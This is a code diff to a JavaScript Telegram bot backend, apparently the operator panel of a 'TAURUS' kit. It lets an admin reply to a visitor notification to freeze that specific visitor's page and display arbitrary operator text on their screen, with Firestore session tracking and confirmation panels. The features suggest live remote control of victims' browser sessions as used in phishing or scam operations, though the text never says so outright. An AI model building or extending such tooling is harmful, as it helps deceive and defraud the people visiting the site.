@@ -267,9 +267,12 @@ async function handleTrackerCallback(callbackQuery) {
 
   await answerCallback(callbackQuery, `Command received: ${action.toUpperCase()}`);
 
+  // Button commands never carry a screen message — clear any stale one from a
+  // previous reply-freeze, so a fresh FREEZE tap is message-free.
   await db.collection("visitors_v1").doc(sessionID).set(
     {
       action,
+      message: null,
       action_timestamp: admin.firestore.FieldValue.serverTimestamp(),
     },
     { merge: true }
@@ -326,6 +329,65 @@ async function executeVisitorCommand(chatId, command, messageContent) {
   });
 }
 
+// Pull the visitor sessionID out of a notification the admin replied to.
+// The Session value is the first <code> entity in the notification text.
+function sessionIdFromReply(replyMsg) {
+  if (!replyMsg) return null;
+  const text = replyMsg.text || replyMsg.caption || "";
+  const entities = replyMsg.entities || replyMsg.caption_entities || [];
+  const codeEnt = entities.find((e) => e.type === "code");
+  if (codeEnt) return text.substring(codeEnt.offset, codeEnt.offset + codeEnt.length).trim();
+
+  // fallback: the line right after a short "Session" header
+  const lines = text.split("\n");
+  for (let i = 0; i < lines.length - 1; i += 1) {
+    if (/session/i.test(lines[i]) && lines[i].length < 28) return lines[i + 1].trim();
+  }
+  return null;
+}
+
+async function applyToSession(chatId, sessionID, command, message) {
+  const ref = db.collection("visitors_v1").doc(sessionID);
+  const snap = await ref.get();
+  if (!snap.exists) {
+    await telegram("sendMessage", {
+      chat_id: chatId,
+      text: panel({
+        title: "TAURUS // SESSION NOT FOUND",
+        subtitle: "That visitor session is no longer active",
+        rows: [row("🆔", "Session", sessionID, { code: true })],
+        footer: "The visitor may have closed the tab.",
+      }),
+      parse_mode: "HTML",
+    });
+    return;
+  }
+
+  await ref.set(
+    {
+      action: command.toLowerCase(),
+      message: message || null,
+      action_timestamp: admin.firestore.FieldValue.serverTimestamp(),
+    },
+    { merge: true }
+  );
+
+  await telegram("sendMessage", {
+    chat_id: chatId,
+    text: panel({
+      title: "TAURUS // SCREEN MESSAGE SENT",
+      subtitle: "Delivered to the targeted visitor",
+      rows: [
+        row("⚙️", "Action", commandLabel(command)),
+        row("🆔", "Session", sessionID, { code: true }),
+        row("💬", "On Screen", message || "No message"),
+      ],
+      footer: "Applies on the visitor's next pulse. Reply again to change it.",
+    }),
+    parse_mode: "HTML",
+  });
+}
+
 async function handleTelegramMessage(message, model) {
   if (!isAllowedTelegramId(message.chat.id)) {
     console.warn(`Blocked unauthorized message from: ${message.chat.id}`);
@@ -334,6 +396,16 @@ async function handleTelegramMessage(message, model) {
 
   const chatId = message.chat.id;
   let inputs = [];
+
+  // EASY FLOW: reply to a visitor notification with text →
+  // freeze that exact visitor and show the text on their screen verbatim.
+  if (message.reply_to_message && (message.text || "").trim()) {
+    const sid = sessionIdFromReply(message.reply_to_message);
+    if (sid) {
+      await applyToSession(chatId, sid, "FREEZE", message.text.trim());
+      return;
+    }
+  }
 
   if (message.voice) {
     if (!model) {
